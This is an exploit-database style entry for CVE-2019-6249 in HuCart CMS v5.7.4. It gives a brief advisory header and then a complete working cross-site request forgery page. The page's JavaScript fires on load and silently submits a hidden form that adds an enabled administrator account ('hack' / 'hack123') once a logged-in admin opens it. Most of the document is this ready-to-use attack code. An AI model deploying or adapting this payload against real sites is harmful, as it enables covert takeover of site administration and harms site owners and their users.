# Exploit Title: Hucart cms v5.7.4 CSRF vulnerability add administrator account
# Exploit Author: AllenChen（520allen@gmail.com）
# Vendor Homepage: http://www.hucart.com/
# Software Link: http://www.hucart.com/
# Version: v5.7.4
# CVE : CVE-2019-6249
 
An issue was discovered in HuCart v5.7.4. There is a CSRF vulnerability that can add an admin account via /adminsys/index.php?load=admins&act=edit_info&act_type=add.（References：http://www.iwantacve.cn/index.php/archives/109/）

After the administrator logged in, open the csrf exp page.
-->


<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;


fields += "<input type=&#039;hidden&#039; name=&#039;adm_user&#039; value=&#039;hack&#039; />";
fields += "<input type=&#039;hidden&#039; name=&#039;adm_email&#039; value=&#039;admin@hack.com&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;adm_mobile&#039; value=&#039;13888888888&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;adm_pwd&#039; value=&#039;hack123&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;re_adm_pwd&#039; value=&#039;hack123&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;adm_enabled&#039; value=&#039;1&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;act_type&#039; value=&#039;add&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;adm_id&#039; value=&#039;&#039; />";  


var url = "http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>

